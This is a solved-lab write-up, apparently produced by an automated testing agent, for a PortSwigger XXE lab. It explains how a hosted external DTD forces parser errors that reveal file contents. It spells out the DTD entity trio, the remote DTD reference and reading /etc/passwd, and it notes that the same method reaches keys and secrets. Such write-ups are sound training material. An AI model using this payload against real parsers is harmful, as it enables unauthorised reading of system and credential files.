# PortSwigger Lab

## Lab

Exploiting blind XXE to retrieve data via error messages

URL: https://0ac10013033363a983c30b0500b20051.web-security-academy.net/

## Vulnerability Class

XXE injection, blind error-based exfiltration – general entities blocked, external DTD via parameter entity (`% xxe;` + clean body) defines file-read + eval entities; nonexistent-file error reflects file content → arbitrary file read without reflection channel

## Objective

Exfiltrate file contents via parser error messages (demonstration lab – solved by `/etc/passwd` error-exfil itself). Established by `is-solved` flip immediately after the evil-DTD trigger. Official description not fetched; external-DTD error pattern from XXE knowledge, validated by error.

## Initial Observations

- Shop + XML stock-check (`POST /product/stock`) – same sink shape as 6 prior XXE labs (current evidence from product page).
- Baseline (`productId=1,storeId=1`) → 200 `328` (count oracle).
- General entity (`file:///etc/passwd` + `&xxe;` in body) → `400 "Entities are not allowed for security reasons"` – body references blocked (same control as parameter-entities lab; DTD layer hypothesized open).
- Exploit server provided (`exploit-.../`, Craft-a-response form: `urlIsHttps/responseFile/responseHead/responseBody/formAction`) – external-DTD host available.
- Stored `methodology/xxe.md` (6 shapes incl. parameter-entity OOB; no external-DTD error-exfil section). No prior error-exfil labs.

## Hypotheses

- H1: Parameter-entity external DTD (`<!ENTITY % xxe SYSTEM "https://.../evil.dtd">` + `%xxe;`, clean body) bypasses the body-reference block (fetch at DTD layer). Evidence needed: error differs from `Entities are not allowed`.
- H2: DTD with `% file;` (target read) + `% eval;` (redefine `exfil` entity pointing at `file:///nonexistent/%file;`) + `%exfil;` forces a `FileNotFoundException` whose path embeds file content → error exfil. Evidence needed: passwd bytes in error.
- H3: Exploit-server file STORE works via direct POST (no browser needed). Evidence needed: stored DTD served back verbatim.

## Attempts

1. Baseline product page + baseline POST (`328`) – sink + shape in 2 requests.
2. General-entity probe → `Entities are not allowed` – block confirmed (1 request, correctly abandoned, not retried).
3. Exploit-server recon (`GET /` → Craft form contract) + `POST /` STORE `/evil.dtd` (file/entity/eval trio) → served back byte-identical (137B) – H3 confirmed (programmatic STORE works; browser unnecessary).
4. Blind payload (external-DTD reference, clean body) → `400 FileNotFoundException: /nonexistent/root:x:0:0...` (FULL passwd) – H1+H2 confirmed first try.
5. `GET /` → `is-solved`/`Solved`/`Congratulations`.

## What Failed

- Nothing on target. No dead ends; 6 requests + 1 store.

## What Worked

- External DTD (`%file` + `%eval` + `%exfil` trio) + clean-body reference → error-embedded file → solved marker.

## Burp Observations

- Baseline, block confirmation, exploit-server recon/STORE/verify, blind trigger, proof – all via Burp MCP (no browser tab opened despite exploit-server UI existing; form contract read from HTML).

## Browser Observations

- Not required. Deliberately avoided (direct POST to STORE endpoint is equivalent, fewer moving parts).

## CLI / Tool Observations

- No CLI tools – Burp replay answered every question. No crawler/fuzzer (single known endpoint).

## Root Cause

Blocklist covers general-entity references in the document body but the parser still fetches external PARAMETER entities (DTD layer): the hosted DTD redefines an entity to point at `file:///nonexistent/<file-content>`, and the resulting `FileNotFoundException` path echoes the content. Data (XML) → DTD fetch → nested entity expansion → error-path disclosure. Blocking `&`-references without disabling external DTD leaves error-oracle exfil open.

## Verification

- Block-vs-bypass differential (`Entities are not allowed` vs `FileNotFoundException` with content) on same endpoint/session; only entity form changed.
- DTD integrity: stored-then-served byte check before triggering (no silent STORE corruption).
- Impact proof: full passwd in error + global `is-solved` via fresh anon `GET /`.

## Impact

Blind arbitrary file read via error messages (demonstrated full `/etc/passwd`; same primitive reads any `file://` path by editing one DTD line – sources/keys/secrets). No reflection channel needed – errors suffice.

## Why The Successful Approach Worked

- Read the block as specification (body `&`-references dead → DTD-layer `%`-references the designed surface, matching prior parameter-entities lesson).
- Staged the DTD first and VERIFIED it served (137B identical) before firing – a corrupted STORE would have produced a misleading negative.
- Kept the trigger body clean (`productId=1`) so the ONLY entity surface was the external DTD under test.

## Generalization

- For `Entities are not allowed`-style blocks needing EXFIL (not just detection): host external DTD (`%file` target read + `%eval` redefine + `%exfil` trigger to `file:///nonexistent/%file;`) on exploit server via direct STORE POST (read form contract; no browser needed) → verify served bytes → reference with clean body → read content from `FileNotFoundException` path.
- Detection (`is-solved`-by-attribution) vs exfiltration (content-in-error) need different DTDs: bare-URL parameter entity vs file/eval/exfil trio – pick by objective.
- STORE-then-verify discipline: never fire blind payloads against unverified hosted files (one GET saves a wasted async cycle).

## Lessons Learned

- External DTD converts blind XXE into error-readable XXE: the eval-redefine trick (`&#x25;` escaping inside DTD) is THE pattern for content without reflection.
- Exploit-server UIs are HTTP forms – read the contract and POST directly; browser tabs are optional overhead.
- Verify hosted payload bytes before triggering blind chains – silent STORE corruption mimics parser hardening.

## Related Methodology

- Extends `methodology/xxe.md` (no external-DTD error-exfil pattern – update justified below; 7th XXE lab, new exfil primitive).
- `methodology/injection.md` does NOT apply. Deliberately not modified.
- Priors: `xxe-blind-oob-parameter-entities.md` (block reading + `%xxe;` syntax + clean body reused verbatim), all XXE notes (endpoint/slot/length recipe).

## References

- Solved instance: https://0ac10013033363a983c30b0500b20051.web-security-academy.net/
- Lab: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
- DTD (current evidence, verified served): `%file` → `file:///etc/passwd`; `%eval` → `<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>`; `%eval;` + `%exfil;`
- Exploit server: direct `POST /` STORE (`urlIsHttps/responseFile/responseHead/responseBody/formAction`) – no browser used
- Deliberately did NOT fetch official solution; error-DTD pattern from XXE knowledge, validated by error content.
